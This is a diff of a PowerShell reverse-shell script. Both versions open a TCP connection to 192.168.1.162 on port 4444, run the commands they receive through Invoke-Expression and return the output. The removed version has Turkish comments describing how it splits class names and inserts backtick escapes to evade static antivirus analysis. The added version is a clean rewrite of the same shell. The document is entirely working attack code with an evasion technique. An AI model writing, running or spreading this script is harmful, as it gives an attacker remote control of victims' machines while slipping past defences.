@@ -1,28 +1,17 @@
-# Değişkenleri anlamsızlaştıralım
-$ip = "192.168.1.162"
-$p = 4444
-
-# Kritik sınıfları parçalayarak çağırıyoruz (Statik analizi atlatmak için)
-$s1 = "Net.Sock" + "ets.TCPCl" + "ient"
-$s2 = "IO.Stream" + "Reader"
-$s3 = "IO.Stream" + "Writer"
-
-$c = New-Object $s1($ip, $p)
-$n = $c.GetStream()
-$r = New-Object $s2($n)
-$w = New-Object $s3($n)
-$w.AutoFlush = $true
-$b = New-Object byte[] 1024
-
-while ($c.Connected) {
-    while ($n.DataAvailable) {
-        $rd = $n.Read($b, 0, $b.Length)
-        $t = ([Text.Encoding]::U`TF8).GetString($b, 0, $rd)
-        
-        # 'iex' yerine 'Invoke-Expression' kullanıp onu da ters tırnakla gizleyelim
-        $out = (I`nvoke-Ex`pression $t 2>&1 | O`ut-St`ring)
-        
-        $w.Write($out)
+$LHOST = "192.168.1.162"
+$LPORT = 4444
+$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
+$NetworkStream = $TCPClient.GetStream()
+$StreamReader = New-Object IO.StreamReader($NetworkStream)
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+$StreamWriter.AutoFlush = $true
+$Buffer = New-Object System.Byte[] 1024
+while ($TCPClient.Connected) {
+    while ($NetworkStream.DataAvailable) {
+        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
+        $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData)
+        $Output = (iex $Code 2>&1 | Out-String)
+        $StreamWriter.Write($Output)
     }
     Start-Sleep -Milliseconds 100
 }
